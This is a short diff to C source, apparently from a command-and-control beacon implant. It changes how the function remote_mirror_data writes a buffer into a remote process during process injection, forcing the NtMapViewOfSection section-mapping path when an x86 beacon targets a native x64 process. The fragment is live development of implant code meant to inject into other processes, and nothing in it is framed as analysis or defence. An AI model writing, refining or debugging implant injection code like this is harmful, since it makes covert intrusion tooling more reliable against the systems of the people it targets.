@@ -166,12 +166,9 @@ char * remote_mirror_data(INJECTCONTEXT * context, char * buffer, int length) {
 	unsigned short option = setting_short(SETTING_PROCINJ_ALLOCATOR);
     /* TODO: remote_mirror_data caller is responsible for allocated memory */
 #if defined _M_IX86
-	/* x86 beacon → native x64 target: VirtualAllocEx/WriteProcessMemory from WOW64 can block the implant thread (cmd 117 / EA). */
-	if (!context->sameArch && !context->samePid) {
-		char * ptr = remote_mirror_data_ntmapviewofsection(context->hProcess, context->pid, buffer, length);
-		if (ptr != NULL)
-			return ptr;
-	}
+	/* x86 beacon → native x64 target: WOW64 VirtualAllocEx/WriteProcessMemory can block (cmd 117). Use section map only. */
+	if (!context->sameArch && !context->samePid)
+		return remote_mirror_data_ntmapviewofsection(context->hProcess, context->pid, buffer, length);
 #endif
 	if (option == ALLOCATOR_NTMAPVIEWOFSECTION && context->sameArch) {
 		return remote_mirror_data_ntmapviewofsection(context->hProcess, context->pid, buffer, length);
